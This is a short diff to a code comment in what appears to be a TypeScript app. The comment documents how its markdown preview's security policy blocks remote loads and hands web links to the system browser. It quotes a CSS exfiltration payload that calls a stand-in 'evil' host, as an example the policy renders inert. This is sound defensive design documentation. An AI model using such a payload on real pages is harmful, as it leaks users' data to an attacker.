@@ -86,9 +86,11 @@ import { markdownStylesheet, type PreviewStyle } from './previewStyle.js';
  *                         on the policy permits a remote URL for anything,
  *                         which is what makes the classic
  *                         `background:url(https://evil/?leak)` inert.
- *   `<a href="https:…">`  Navigates, is refused by the app's own `frame-src`,
- *                         and Chromium paints its error page — the known limit
- *                         the HTML preview already carries and Reload recovers.
+ *   `<a href="https:…">`  Navigates the frame; main hands a WEB url to the
+ *                         system browser (`will-frame-navigate` in index.ts,
+ *                         the same allow-list window.open goes through) and
+ *                         refuses the in-app navigation. The preview itself
+ *                         never touches the network.
  *   local `<img src>`     Reads a file on the host and shows it TO THE USER,
  *                         who is browsing that host over SFTP and can already
  *                         read it. No new capability.
